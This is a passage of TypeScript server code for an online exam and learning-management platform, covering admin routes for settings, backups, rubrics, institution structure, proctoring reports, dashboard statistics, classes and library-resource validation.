    const mode = LEARNING_STRUCTURE_MODES.includes(ls.mode as LearningStructureMode) ? (ls.mode as LearningStructureMode) : current.mode;
    s.learningStructure = {
      mode,
      useAcademicYears: typeof ls.useAcademicYears === "boolean" ? ls.useAcademicYears : current.useAcademicYears,
      useSemesters: typeof ls.useSemesters === "boolean" ? ls.useSemesters : current.useSemesters,
      useLevels: typeof ls.useLevels === "boolean" ? ls.useLevels : current.useLevels,
      useCohorts: typeof ls.useCohorts === "boolean" ? ls.useCohorts : current.useCohorts,
      academicYearLabel: typeof ls.academicYearLabel === "string" && ls.academicYearLabel.trim() ? ls.academicYearLabel.trim() : current.academicYearLabel,
      semesterLabel: typeof ls.semesterLabel === "string" && ls.semesterLabel.trim() ? ls.semesterLabel.trim() : current.semesterLabel,
      levelLabel: typeof ls.levelLabel === "string" && ls.levelLabel.trim() ? ls.levelLabel.trim() : current.levelLabel,
      cohortLabel: typeof ls.cohortLabel === "string" && ls.cohortLabel.trim() ? ls.cohortLabel.trim() : current.cohortLabel,
    };
  }
  await db.upsert("settings", s);
  await recordAudit(req, "settings.updated", "Updated organization settings");
  res.json({ settings: s });
});

// Foundational Learning Structure config (Academic/Cohort/Hybrid) — read by
// any authenticated role, since every module eventually needs to know which
// structural concepts are active for this institution. Write access stays
// admin-only via PATCH /api/admin/settings above.
app.get("/api/learning-structure", requireAuth, (_req, res) => {
  res.json({ learningStructure: getSettings().learningStructure ?? DEFAULT_LEARNING_STRUCTURE });
});

// Send the admin summary digest immediately (covers the last 7 days).
app.post("/api/admin/digest/send-now", requireRole("admin"), async (req, res) => {
  const sent = await sendAdminDigest(Date.now() - 7 * 24 * 3_600_000, "weekly");
  await recordAudit(req, "digest.sent", `${sent} admin(s)`);
  res.json({ sent });
});

// ---- admin: database backup ----
// A full gzip-compressed logical snapshot of every table, written to a folder
// outside the app's redeployable code and outside the live data directory (see
// server/backup.ts) so it survives redeploys and is picked up by whatever
// off-host/whole-account backup mechanism the host runs.
app.get("/api/admin/backup/status", requireRole("admin"), (_req, res) => {
  res.json(backupStatus());
});
app.post("/api/admin/backup/run-now", requireRole("admin"), async (req, res) => {
  try {
    const { file, bytes } = await runBackup();
    await recordAudit(req, "backup.run", `${path.basename(file)} (${bytes} bytes)`);
    res.json({ ok: true, file: path.basename(file), bytes });
  } catch (e) {
    res.status(500).json({ error: e instanceof Error ? e.message : "Backup failed." });
  }
});

// ---- admin: reusable rubric library (stored on org settings) ----
app.get("/api/admin/rubric-library", requireRoles(...GRADERS), (_req, res) => {
  res.json({ rubrics: getSettings().rubricLibrary ?? [] });
});

app.post("/api/admin/rubric-library", requireRole("admin"), async (req, res) => {
  const s = getSettings();
  const name = String(req.body?.name ?? "").trim();
  const criteria: RubricCriterion[] = (Array.isArray(req.body?.criteria) ? req.body.criteria : [])
    .filter((c: { label?: unknown }) => c && typeof c.label === "string" && c.label.trim())
    .map((c: { id?: unknown; label: string; maxPoints?: unknown }) => ({ id: String(c.id || nanoid(6)), label: String(c.label).trim(), maxPoints: Math.max(0, Math.round(Number(c.maxPoints) || 0)) }));
  if (!name || criteria.length === 0) return res.status(400).json({ error: "A name and at least one criterion are required." });
  const entry = { id: nanoid(8), name, criteria };
  s.rubricLibrary = [...(s.rubricLibrary ?? []), entry];
  await db.upsert("settings", s);
  await recordAudit(req, "rubric.saved", name);
  res.json({ rubric: entry });
});

app.delete("/api/admin/rubric-library/:id", requireRole("admin"), async (req, res) => {
  const s = getSettings();
  s.rubricLibrary = (s.rubricLibrary ?? []).filter((r) => r.id !== req.params.id);
  await db.upsert("settings", s);
  res.json({ ok: true });
});

// ---- admin: Institution structure (faculties / departments / programs / campuses / academic years) ----
const INSTITUTION_KINDS: Record<string, "faculties" | "departments" | "programs" | "campuses" | "academicYears"> = {
  faculties: "faculties", departments: "departments", programs: "programs", campuses: "campuses", "academic-years": "academicYears",
};
const byName = (a: { name: string }, b: { name: string }) => a.name.localeCompare(b.name);

app.get("/api/admin/institution", requireRoles(...GRADERS), (_req, res) => {
  const d = db.data!;
  res.json({
    settings: getSettings(),
    counts: { faculties: d.faculties.length, departments: d.departments.length, programs: d.programs.length, campuses: d.campuses.length, academicYears: d.academicYears.length },
    faculties: [...d.faculties].sort(byName),
    departments: [...d.departments].sort(byName),
    programs: [...d.programs].sort(byName),
    campuses: [...d.campuses].sort(byName),
    academicYears: [...d.academicYears].sort((a, b) => (b.startDate ?? b.createdAt).localeCompare(a.startDate ?? a.createdAt)),
  });
});

app.post("/api/admin/institution/:kind", requireRole("admin"), async (req, res) => {
  const key = INSTITUTION_KINDS[String(req.params.kind)];
  if (!key) return res.status(404).json({ error: "Unknown type." });
  const name = String(req.body?.name ?? "").trim();
  if (!name) return res.status(400).json({ error: "Name is required." });
  const item: Record<string, unknown> = { id: nanoid(10), name, createdAt: now() };
  const b = req.body ?? {};
  if (key === "departments") item.facultyId = b.facultyId || null;
  if (key === "programs") { item.departmentId = b.departmentId || null; if (b.level) item.level = String(b.level); }
  if (key === "campuses" && b.location) item.location = String(b.location).trim();
  const arr = (db.data as unknown as Record<string, Record<string, unknown>[]>)[key];
  if (key === "academicYears") {
    item.startDate = b.startDate || null; item.endDate = b.endDate || null; item.current = !!b.current;
    if (item.current) arr.forEach((y) => { y.current = false; });
  }
  arr.push(item);
  await db.write();
  await recordAudit(req, `institution.${req.params.kind}.added`, name);
  res.json({ item });
});

app.delete("/api/admin/institution/:kind/:id", requireRole("admin"), async (req, res) => {
  const key = INSTITUTION_KINDS[String(req.params.kind)];
  if (!key) return res.status(404).json({ error: "Unknown type." });
  const store = db.data as unknown as Record<string, { id: string }[]>;
  store[key] = store[key].filter((x) => x.id !== req.params.id);
  await db.write();
  res.json({ ok: true });
});

// ---- admin: Audit logs ----
app.get("/api/admin/audit-logs", requireRole("admin"), async (_req, res) => {
  res.json({ logs: await auditStore.recent(200), integrity: await auditStore.verifyChain() });
});

// ---- admin: AI Violations (live integrity-event feed) ----
app.get("/api/admin/violations", requireRoles(...STAFF), async (_req, res) => {
  const userName = (id: string) => db.data!.users.find((u) => u.id === id)?.name ?? "Candidate";
  const examTitle = (id: string) => db.data!.exams.find((e) => e.id === id)?.title ?? "Examination";
  const attemptMap = new Map(db.data!.attempts.map((a) => [a.id, a]));
  const flagged = await proctorStore.allFlagged();
  const events = [...flagged]
    .sort((a, b) => b.at.localeCompare(a.at))
    .slice(0, 100)
    .map((e) => {
      const at = attemptMap.get(e.attemptId);
      return {
        id: e.id, type: e.type, severity: e.severity, message: e.message, at: e.at,
        candidate: at ? userName(at.candidateId) : "—", exam: at ? examTitle(at.examId) : "—",
        attemptId: e.attemptId,
      };
    });
  res.json({
    events,
    summary: {
      total: flagged.length,
      high: flagged.filter((e) => e.severity === "high").length,
      warning: flagged.filter((e) => e.severity === "warning").length,
      liveSessions: db.data!.attempts.filter((a) => a.status === "in_progress").length,
    },
  });
});

// ---- admin: System health / diagnostics ----
app.get("/api/admin/system-health", requireRole("admin"), async (_req, res) => {
  const d = db.data!;
  res.json({
    api: "ok",
    db: {
      engine: "PostgreSQL (PGlite, embedded)",
      durable: true,
      collections: {
        users: d.users.length, exams: d.exams.length, questions: d.questions.length,
        registrations: d.registrations.length, attempts: d.attempts.length, answers: await answerStore.totalCount(),
        proctorEvents: await proctorStore.totalCount(), snapshots: await snapshotStore.totalCount(), certificates: d.certificates.length,
        emails: await emailStore.count(), announcements: d.announcements.length, auditLogs: await auditStore.count(),
      },
    },
    mailer: mailerStatus(),
    sms: smsStatus(),
    backup: backupStatus(),
    env: { nodeEnv: process.env.NODE_ENV ?? "development", apiPort: PORT, webPort: 5180 },
    uptimeSeconds: Math.round(process.uptime()),
    serverTime: now(),
  });
});

// ---- admin: Dashboard (aggregated overview) ----
app.get("/api/admin/dashboard", requireRoles(...STAFF), async (_req, res) => {
  const d = db.data!;
  const candidateIds = new Set(d.users.filter((u) => u.role === "candidate").map((u) => u.id));
  const regs = d.registrations.filter((r) => candidateIds.has(r.candidateId));
  const submitted = d.attempts.filter((a) => a.status === "submitted" && !examById(a.examId)?.practice);
  const grade = (s: number) => (s >= 80 ? "A" : s >= 70 ? "B" : s >= 60 ? "C" : s >= 50 ? "D" : "F");
  const monthKey = (iso: string) => { const x = new Date(iso); return `${x.getFullYear()}-${x.getMonth()}`; };

  // 12-month activity buckets.
  const nowD = new Date();
  const months: { key: string; label: string }[] = [];
  for (let i = 11; i >= 0; i--) {
    const x = new Date(nowD.getFullYear(), nowD.getMonth() - i, 1);
    months.push({ key: `${x.getFullYear()}-${x.getMonth()}`, label: x.toLocaleString(undefined, { month: "short" }) });
  }
  const examActivity = months.map((m) => ({
    label: m.label,
    taken: d.attempts.filter((a) => monthKey(a.startedAt) === m.key).length,
    created: d.exams.filter((e) => monthKey(e.createdAt) === m.key).length,
    passed: submitted.filter((a) => a.passed && a.submittedAt && monthKey(a.submittedAt) === m.key).length,
  }));

  // Month-over-month completion growth.
  const thisKey = `${nowD.getFullYear()}-${nowD.getMonth()}`;
  const lastD = new Date(nowD.getFullYear(), nowD.getMonth() - 1, 1);
  const lastKey = `${lastD.getFullYear()}-${lastD.getMonth()}`;
  const subThis = submitted.filter((a) => a.submittedAt && monthKey(a.submittedAt) === thisKey).length;
  const subLast = submitted.filter((a) => a.submittedAt && monthKey(a.submittedAt) === lastKey).length;
  const growth = subLast === 0 ? (subThis > 0 ? 100 : 0) : Math.round(((subThis - subLast) / subLast) * 1000) / 10;

  const startOfToday = new Date(nowD.getFullYear(), nowD.getMonth(), nowD.getDate()).getTime();
  const examsToday = d.attempts.filter((a) => new Date(a.startedAt).getTime() >= startOfToday).length;

  const scores = submitted.map((a) => a.score ?? 0);
  const avgScore = scores.length ? Math.round(scores.reduce((p, c) => p + c, 0) / scores.length) : 0;
  const confirmed = regs.filter((r) => r.approval === "confirmed").length;
  const completionRate = confirmed ? Math.round((regs.filter((r) => r.status === "submitted").length / confirmed) * 100) : 0;

  const subjectPerformance = d.exams
    .filter((e) => !e.practice)
    .map((e) => {
      const ax = submitted.filter((a) => a.examId === e.id);
      const s = ax.map((a) => a.score ?? 0);
      const n = ax.length || 1;
      const pct = (f: (sc: number) => boolean) => Math.round((s.filter(f).length / n) * 100);
      return {
        title: e.title, code: e.code, attempts: ax.length,
        avgScore: s.length ? Math.round(s.reduce((p, c) => p + c, 0) / s.length) : 0,
        passRate: ax.length ? Math.round((ax.filter((a) => a.passed).length / ax.length) * 100) : 0,
        // Distribution of scores into bands → segmented bar.
        bands: {
          excellent: pct((x) => x >= 80),
          good: pct((x) => x >= 60 && x < 80),
          average: pct((x) => x >= 40 && x < 60),
          poor: pct((x) => x < 40),
        },
      };
    })
    .sort((a, b) => b.attempts - a.attempts)
    .slice(0, 6);

  const recentSlice = [...submitted]
    .sort((a, b) => (b.submittedAt ?? "").localeCompare(a.submittedAt ?? ""))
    .slice(0, 8);
  const liveAttempts = d.attempts.filter((a) => a.status === "in_progress");
  const dashEvMap = await proctorStore.forAttempts([...recentSlice.map((a) => a.id), ...liveAttempts.map((a) => a.id)]);
  const dashAnsMap = await answerStore.forAttempts(recentSlice.map((a) => a.id));
  const recentResults = recentSlice
    .map((a) => {
      const u = d.users.find((x) => x.id === a.candidateId);
      const exam = examById(a.examId);
      const secs = a.submittedAt ? Math.max(0, Math.round((new Date(a.submittedAt).getTime() - new Date(a.startedAt).getTime()) / 1000)) : 0;
      const pending = a.gradingStatus === "pending_review";
      const totalQuestions = d.questions.filter((q) => q.examId === a.examId).length;
      const correctCount = (dashAnsMap.get(a.id) ?? []).filter((an) => an.correct === true).length;
      return {
        attemptId: a.id, name: u?.name ?? "Candidate", studentId: a.candidateId.slice(-6).toUpperCase(),
        examTitle: exam?.title ?? "Examination", score: a.score ?? 0, grade: pending ? "—" : grade(a.score ?? 0),
        timeSpent: `${String(Math.floor(secs / 60)).padStart(2, "0")}:${String(secs % 60).padStart(2, "0")}`,
        submittedAt: a.submittedAt, status: pending ? "pending" : a.passed ? "passed" : "failed",
        integrity: scoreOf(cleanEvents(dashEvMap.get(a.id) ?? [], a.submittedAt)), correctCount, totalQuestions,
      };
    });

  const flaggedLive = liveAttempts.filter((a) => (dashEvMap.get(a.id) ?? []).some((e) => e.severity !== "info")).length;

  const nowMs = nowD.getTime();

  // ---- Live exams monitoring: in-progress attempts grouped by exam ----
  const liveByExam = new Map<string, typeof liveAttempts>();
  for (const a of liveAttempts) {
    const arr = liveByExam.get(a.examId) ?? [];
    arr.push(a);
    liveByExam.set(a.examId, arr);
  }
  const liveExams = [...liveByExam.entries()]
    .map(([examId, ax]) => {
      const exam = examById(examId);
      const starts = ax.map((a) => new Date(a.startedAt).getTime());
      const earliestStart = Math.min(...starts);
      const dur = exam?.durationMinutes ?? ax[0].durationMinutes ?? 60;
      const soonestDeadline = Math.min(...ax.map((a) => new Date(a.startedAt).getTime() + (a.durationMinutes || dur) * 60000));
      return {
        examId,
        title: exam?.title ?? "Examination",
        code: exam?.code ?? "",
        students: ax.length,
        minutesLeft: Math.max(0, Math.round((soonestDeadline - nowMs) / 60000)),
        startAt: new Date(earliestStart).toISOString(),
        endAt: new Date(earliestStart + dur * 60000).toISOString(),
        flagged: ax.filter((a) => (dashEvMap.get(a.id) ?? []).some((e) => e.severity !== "info")).length,
      };
    })
    .sort((a, b) => a.minutesLeft - b.minutesLeft)
    .slice(0, 6);

  // ---- Questions performance: skip rate + most-skipped subject (bounded scan) ----
  const perfIds = submitted.slice(-150).map((a) => a.id);
  const perfAns = await answerStore.forAttempts(perfIds);
  let totalAns = 0, blankAns = 0;
  const skipByQ = new Map<string, number>();
  for (const arr of perfAns.values()) {
    for (const an of arr) {
      totalAns++;
      if (!an.value || String(an.value).trim() === "") {
        blankAns++;
        skipByQ.set(an.questionId, (skipByQ.get(an.questionId) ?? 0) + 1);
      }
    }
  }
  let topSkip: { count: number; subject: string } | null = null;
  for (const [qid, count] of skipByQ) {
    if (topSkip && count <= topSkip.count) continue;
    const q = d.questions.find((x) => x.id === qid);
    topSkip = { count, subject: q ? examById(q.examId)?.title ?? "—" : "—" };
  }
  const questionsPerf = {
    skipRate: totalAns ? Math.round((blankAns / totalAns) * 100) : 0,
    mostSkippedCount: topSkip?.count ?? 0,
    subject: topSkip?.subject ?? "—",
  };

  // ---- Proctoring: attempts with at least one non-info event (recent + live window) ----
  const cheatingDetected = [...dashEvMap.values()].filter((evs) => evs.some((e) => e.severity !== "info")).length;

  // ---- Result overview: each candidate's best score, banded ----
  const bestByCand = new Map<string, number>();
  for (const a of submitted) {
    const sc = a.score ?? 0;
    const prev = bestByCand.get(a.candidateId);
    if (prev === undefined || sc > prev) bestByCand.set(a.candidateId, sc);
  }
  const bestScores = [...bestByCand.values()];
  const topCount = bestScores.filter((s) => s >= 80).length;
  const failCount = bestScores.filter((s) => s < 50).length;
  const avgCount = bestScores.length - topCount - failCount;
  const totalStudents = bestScores.length;
  const bandPct = (n: number) => (totalStudents ? Math.round((n / totalStudents) * 100) : 0);
  const resultOverview = {
    totalStudents,
    avgCgpa: Math.round((avgScore / 100) * 5 * 100) / 100,
    cgpaTrend: growth,
    bands: {
      top: { count: topCount, pct: bandPct(topCount) },
      average: { count: avgCount, pct: bandPct(avgCount) },
      fail: { count: failCount, pct: bandPct(failCount) },
    },
  };

  // ---- Upcoming exams: future-scheduled class assignments ----
  const upcomingExams = d.classes
    .flatMap((c) =>
      c.assignments
        .filter((a) => a.scheduledStart && new Date(a.scheduledStart).getTime() > nowMs)
        .map((a) => {
          const exam = examById(a.examId);
          return {
            examId: a.examId,
            subject: exam?.title ?? "Examination",
            className: c.name,
            scheduledStart: a.scheduledStart!,
            durationMinutes: exam?.durationMinutes ?? 0,
            candidates: c.memberIds.length,
            msLeft: new Date(a.scheduledStart!).getTime() - nowMs,
          };
        }),
    )
    .sort((a, b) => a.msLeft - b.msLeft)
    .slice(0, 6);

  // ---- Insights (hoisted so the health score can reuse them) ----
  const pendingReviews = d.attempts.filter((a) => a.gradingStatus === "pending_review").length;
  const passRate = submitted.length ? Math.round((submitted.filter((a) => a.passed).length / submitted.length) * 100) : 0;

  // ---- Academic insights: weakest / strongest subjects (real per-exam history) ----
  const subjectStats = d.exams
    .filter((e) => !e.practice)
    .map((e) => {
      const ax = submitted.filter((a) => a.examId === e.id);
      const s = ax.map((a) => a.score ?? 0);
      return {
        examId: e.id, title: e.title, code: e.code, attempts: ax.length,
        avgScore: s.length ? Math.round(s.reduce((p, c) => p + c, 0) / s.length) : 0,
        passRate: ax.length ? Math.round((ax.filter((a) => a.passed).length / ax.length) * 100) : 0,
      };
    })
    .filter((x) => x.attempts > 0);
  const weakestSubjects = [...subjectStats].sort((a, b) => a.passRate - b.passRate || a.avgScore - b.avgScore).slice(0, 4);
  const strongestSubjects = [...subjectStats].sort((a, b) => b.passRate - a.passRate || b.avgScore - a.avgScore).slice(0, 4);

  // ---- Predicted outcomes: at-risk students + candidate-weighted forecast for upcoming exams ----
  const scoresByCand = new Map<string, number[]>();
  for (const a of submitted) {
    const arr = scoresByCand.get(a.candidateId) ?? [];
    arr.push(a.score ?? 0);
    scoresByCand.set(a.candidateId, arr);
  }
  let atRiskCount = 0;
  for (const arr of scoresByCand.values()) {
    if (arr.reduce((p, c) => p + c, 0) / arr.length < 50) atRiskCount++;
  }
  const examHistPass = (examId: string): number | null => {
    const ax = submitted.filter((a) => a.examId === examId);
    return ax.length ? ax.filter((a) => a.passed).length / ax.length : null;
  };
  let projWSum = 0, projWTot = 0;
  for (const u of upcomingExams) {
    const hp = examHistPass(u.examId);
    if (hp !== null && u.candidates > 0) { projWSum += hp * u.candidates; projWTot += u.candidates; }
  }
  const predicted = {
    atRiskCount,
    assessedStudents: scoresByCand.size,
    projectedPassRate: projWTot ? Math.round((projWSum / projWTot) * 100) : null,
    forecastCandidates: projWTot,
    trend: growth,
  };

  // ---- Institution health score: weighted blend of real operational signals (0–100) ----
  const integrityDenom = submitted.length + liveAttempts.length;
  const integrityScore = integrityDenom ? Math.max(0, Math.round((1 - cheatingDetected / integrityDenom) * 100)) : 100;
  const gradingScore = submitted.length ? Math.max(0, Math.round((1 - Math.min(1, pendingReviews / submitted.length)) * 100)) : 100;
  const completionScore = completionRate;
  const healthBreakdown = [
    { label: "Pass rate", value: passRate, weight: 35 },
    { label: "Integrity", value: integrityScore, weight: 25 },
    { label: "Grading throughput", value: gradingScore, weight: 20 },
    { label: "Completion", value: completionScore, weight: 20 },
  ];
  const healthScore = Math.round(healthBreakdown.reduce((p, c) => p + (c.value * c.weight) / 100, 0));
  const health = {
    score: healthScore,
    band: healthScore >= 80 ? "Healthy" : healthScore >= 60 ? "Fair" : "Needs attention",
    breakdown: healthBreakdown,
  };

  res.json({
    cards: {
      completionRate, completionGrowth: growth,
      activeStudents: candidateIds.size,
      questions: d.questions.length,
      examsToday,
    },
    examActivity,
    subjectPerformance,
    recentResults,
    insights: {
      totalExams: d.exams.filter((e) => !e.practice).length,
      completed: submitted.length,
      pendingReviews,
      failed: submitted.filter((a) => a.passed === false).length,
      avgScore,
      passRate,
    },
    live: { sessions: liveAttempts.length, flagged: flaggedLive },
    liveExams,
    questionsPerf,
    proctoring: { cheatingDetected },
    resultOverview,
    upcomingExams,
    health,
    academicInsights: { weakest: weakestSubjects, strongest: strongestSubjects },
    predicted,
    activity: await auditStore.recent(8),
  });
});

// ---- admin: Classes (cohorts) ----
app.get("/api/admin/classes", requireRoles(...GRADERS), (_req, res) => {
  const classes = [...db.data!.classes]
    .sort((a, b) => a.name.localeCompare(b.name))
    .map((c) => ({ id: c.id, name: c.name, code: c.code ?? "", description: c.description ?? "", members: c.memberIds.length, assignments: c.assignments.length }));
  res.json({ classes });
});

app.post("/api/admin/classes", requireRole("admin"), async (req, res) => {
  const name = String(req.body?.name ?? "").trim();
  if (!name) return res.status(400).json({ error: "Class name is required." });
  const cls = { id: nanoid(10), name, code: String(req.body?.code ?? "").trim(), description: String(req.body?.description ?? "").trim(), memberIds: [], assignments: [], createdAt: now() };
  db.data!.classes.push(cls);
  await db.upsert("classes", cls);
  await recordAudit(req, "class.created", name);
  res.json({ class: cls });
});

// Classes that have this exam assigned (for the Exam Builder audience panel).
app.get("/api/admin/exams/:id/classes", requireRole("admin"), (req, res) => {
  const examId = req.params.id;
  const classes = db.data!.classes
    .filter((c) => c.assignments.some((a) => a.examId === examId))
    .map((c) => {
      const last = [...c.assignments].filter((a) => a.examId === examId).sort((a, b) => b.assignedAt.localeCompare(a.assignedAt))[0];
      return { id: c.id, name: c.name, members: c.memberIds.length, scheduledStart: last?.scheduledStart ?? null };
    });
  res.json({ classes });
});

app.get("/api/admin/classes/:id", requireRole("admin"), (req, res) => {
  const cls = db.data!.classes.find((c) => c.id === req.params.id);
  if (!cls) return res.status(404).json({ error: "Class not found." });
  const members = cls.memberIds
    .map((id) => db.data!.users.find((u) => u.id === id && u.role === "candidate"))
    .filter(Boolean)
    .map((u) => ({ id: u!.id, name: u!.name, email: u!.email, studentClass: u!.studentClass ?? null }));
  const assignments = [...cls.assignments]
    .sort((a, b) => b.assignedAt.localeCompare(a.assignedAt))
    .map((a) => {
      const exam = db.data!.exams.find((e) => e.id === a.examId);
      const memberSet = new Set(cls.memberIds);
      const regs = db.data!.registrations.filter((r) => r.examId === a.examId && memberSet.has(r.candidateId));
      const submitted = regs.filter((r) => r.status === "submitted").length;
      const ats = (db.data!.attempts ?? []).filter((at) => at.examId === a.examId && memberSet.has(at.candidateId));
      const scores = ats.map((at) => at.score).filter((s): s is number => typeof s === "number");
      const avgScore = scores.length ? Math.round(scores.reduce((s, v) => s + v, 0) / scores.length) : null;
      const passing = scores.filter((s) => s >= (exam?.passingScore ?? 50)).length;
      const passRate = scores.length ? Math.round((passing / scores.length) * 100) : null;
      return { ...a, examTitle: exam?.title ?? "Examination", memberCount: cls.memberIds.length, submitted, avgScore, passRate };
    });
  res.json({ class: { id: cls.id, name: cls.name, code: cls.code ?? "", description: cls.description ?? "" }, members, assignments });
});

app.patch("/api/admin/classes/:id", requireRole("admin"), async (req, res) => {
  const cls = db.data!.classes.find((c) => c.id === req.params.id);
  if (!cls) return res.status(404).json({ error: "Class not found." });
  const b = req.body ?? {};
  if (typeof b.name === "string" && b.name.trim()) cls.name = b.name.trim();
  if (typeof b.code === "string") cls.code = b.code.trim();
  if (typeof b.description === "string") cls.description = b.description.trim();
  await db.upsert("classes", cls);
  res.json({ ok: true });
});

app.delete("/api/admin/classes/:id", requireRole("admin"), async (req, res) => {
  db.data!.classes = db.data!.classes.filter((c) => c.id !== req.params.id);
  await db.remove("classes", String(req.params.id));
  res.json({ ok: true });
});

// ---- admin: digital library / DLRMS ----
// coverImage follows the exact same convention as Exam.coverImage: a
// validated data:image/ URL, no separate file storage. There is no in-app
// reader — externalUrl is an optional plain link to the resource's content
// (the recommended way to reference lecture-length video/audio, since direct
// upload is bounded by the data-URL-in-JSONB storage model below).
const BOOK_FILE_MAX = 25_000_000; // matches the express.json limit set for this route
const ALLOWED_RESOURCE_MIME = [
  "application/pdf",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document", // .docx
  "application/vnd.openxmlformats-officedocument.presentationml.presentation", // .pptx
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", // .xlsx
  "application/zip", "application/x-zip-compressed",
  "audio/mpeg", "audio/mp3", "video/mp4",
  "image/jpeg", "image/png", "image/webp",
];

function sha256OfDataUrl(dataUrl: string): string {
  return createHash("sha256").update(dataUrl.slice(dataUrl.indexOf(",") + 1), "base64").digest("hex");
}
function decodedByteLength(dataUrl: string): number {
  return Buffer.byteLength(dataUrl.slice(dataUrl.indexOf(",") + 1), "base64");
}

/** Average rating (0 if none yet) and count for a resource — computed on
 *  read since resourceRatings is small per-book, no need to denormalize. */
function ratingSummary(bookId: string): { avg: number; count: number } {
  const ratings = db.data!.resourceRatings.filter((r) => r.bookId === bookId);
  if (!ratings.length) return { avg: 0, count: 0 };
  return { avg: Math.round((ratings.reduce((s, r) => s + r.score, 0) / ratings.length) * 10) / 10, count: ratings.length };
}

/** Real access-control gate: institution-wide by default, or scoped to
 *  specific classes (via ClassGroup.memberIds — the only real enrollment
 *  primitive this app has) and/or specific students. Faculty/department/
 *  programme/course/level are descriptive metadata only, not gates, since
 *  User has no faculty/department/programme fields to check against. */
function studentCanSeeBook(book: Book, user: User): boolean {
  if (book.status !== "published") return false;
  const nowIso = now();
  if (book.availableFrom && book.availableFrom > nowIso) return false;
  if (book.availableUntil && book.availableUntil < nowIso) return false;
  if (book.visibility.scope === "institution") return true;
  if (book.visibility.studentIds.includes(user.id)) return true;
  return db.data!.classes.some((c) => book.visibility.classIds.includes(c.id) && c.memberIds.includes(user.id));
}

function studentsInScope(book: Book): User[] {
  if (book.visibility.scope === "institution") return db.data!.users.filter((u) => u.role === "candidate");
  const ids = new Set(book.visibility.studentIds);
  for (const cls of db.data!.classes) if (book.visibility.classIds.includes(cls.id)) for (const id of cls.memberIds) ids.add(id);
  return db.data!.users.filter((u) => u.role === "candidate" && ids.has(u.id));
}

/** Best-effort email fan-out when an admin/facilitator opts in to notify
 *  students at publish time. In-app notification is separate — see the
 *  derived /api/notifications feed below, which needs no opt-in. */
async function notifyResourcePublished(book: Book) {
  const url = `${env.appUrl}/library`;
  const subject = `New library resource: ${book.title}`;
  const text = `Hi,\n\nA new resource "${book.title}" (${book.resourceType}) has been added to the library.\n\nView it at ${url}\n\n— Oriole`;
  const bodyHtml = `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>New library resource</strong></p>
     <p style="margin:0 0 16px">"${esc(book.title)}" (${esc(book.resourceType)}) has been added to the library.</p>
     ${ctaButton("Open the library", url)}`;
  for (const student of studentsInScope(book)) {
    try { await sendMail(student.email, subject, text, buildHtml(bodyHtml, student.email)); } catch { /* best-effort */ }
  }
}

// Sync field validation only — fileData's page count (if it's a PDF) is
// detected asynchronously by detectPdfPageCount, since that requires
// actually parsing the document.
function validateBookBody(b: Record<string, unknown>): { errors: string[]; book: Partial<Book>; manualTotalPages: number | null; duplicateOf: { id: string; title: string } | null } {
  const errors: string[] = [];
  const title = String(b.title ?? "").trim();
  const author = String(b.author ?? "").trim();
  const genre = String(b.genre ?? BOOK_GENRES[0]);
  const resourceType = String(b.resourceType ?? "") as ResourceType;
  if (!title) errors.push("Title is required.");
  if (!author) errors.push("Author is required.");
  if (!RESOURCE_TYPES.includes(resourceType)) errors.push("A valid resource type is required.");
  if (resourceType === "eBook" && !BOOK_GENRES.includes(genre as BookGenre)) errors.push("A valid genre is required for eBooks.");

  const totalPagesRaw = Number(b.totalPages);
  const manualTotalPages = Number.isFinite(totalPagesRaw) && totalPagesRaw >= 1 ? Math.round(totalPagesRaw) : null;

  let coverImage: string | null = null;
  if (typeof b.coverImage === "string" && b.coverImage.startsWith("data:image/") && b.coverImage.length < 1_500_000) {
    coverImage = b.coverImage;
  } else if (b.coverImage) {
    errors.push("Cover image must be a valid image under ~1MB.");
  }

  let fileData: string | null = null;
  let fileMime: string | null = null;
  let fileSize: number | null = null;
  let checksum: string | null = null;
  let duplicateOf: { id: string; title: string } | null = null;
  const fileName = typeof b.fileName === "string" ? b.fileName.trim().slice(0, 200) : null;
  if (typeof b.fileData === "string" && b.fileData.startsWith("data:")) {
    const mime = b.fileData.slice(5, b.fileData.indexOf(";"));
    if (!ALLOWED_RESOURCE_MIME.includes(mime)) {
      errors.push("Unsupported file type. Allowed: PDF, DOCX, PPTX, XLSX, ZIP, MP3, MP4, JPEG/PNG/WEBP.");
    } else if (b.fileData.length >= BOOK_FILE_MAX) {
      errors.push("The uploaded file must be under ~20MB. For lecture-length video/audio, use an external link instead.");
    } else {
      fileData = b.fileData;
      fileMime = mime;
      fileSize = decodedByteLength(b.fileData);
      checksum = sha256OfDataUrl(b.fileData);
      const existing = db.data!.books.find((bk) => bk.checksum === checksum);
      if (existing) duplicateOf = { id: existing.id, title: existing.title };
    }
  } else if (b.fileData) {
    errors.push("Invalid file upload.");
  }

  let externalUrl: string | null = null;
  if (typeof b.externalUrl === "string" && b.externalUrl.trim()) {
    try { externalUrl = new URL(b.externalUrl.trim()).toString(); }
    catch { errors.push("The resource link must be a valid URL."); }
  }

  const tags = Array.isArray(b.tags) ? (b.tags as unknown[]).map((t) => String(t).trim()).filter(Boolean).slice(0, 20) : [];
  const difficultyRaw = String(b.difficulty ?? "");
  const difficulty: ResourceDifficulty | null = (RESOURCE_DIFFICULTIES as readonly string[]).includes(difficultyRaw) ? (difficultyRaw as ResourceDifficulty) : null;
  const readingTimeRaw = Number(b.estimatedReadingTime);
  const estimatedReadingTime = Number.isFinite(readingTimeRaw) && readingTimeRaw > 0 ? Math.round(readingTimeRaw) : null;

  const faculty = db.data!.faculties.find((f) => f.id === b.facultyId);
  const department = db.data!.departments.find((d) => d.id === b.departmentId);
  const program = db.data!.programs.find((p) => p.id === b.programId);
  const academicYear = db.data!.academicYears.find((y) => y.id === b.academicYearId);

  const visibilityScope: "institution" | "scoped" = b.visibilityScope === "scoped" ? "scoped" : "institution";
  const classIds = Array.isArray(b.classIds) ? (b.classIds as unknown[]).map(String).filter((id) => db.data!.classes.some((c) => c.id === id)) : [];
  const studentIds = Array.isArray(b.studentIds) ? (b.studentIds as unknown[]).map(String).filter((id) => db.data!.users.some((u) => u.id === id && u.role === "candidate")) : [];

  const status: "draft" | "published" = b.status === "published" ? "published" : "draft";

  let availableFrom: string | null = null;
  if (typeof b.availableFrom === "string" && b.availableFrom.trim()) {
    const d = new Date(b.availableFrom);
    if (Number.isNaN(d.getTime())) errors.push("Scheduled publish date is invalid.");
    else availableFrom = d.toISOString();
  }
  let availableUntil: string | null = null;
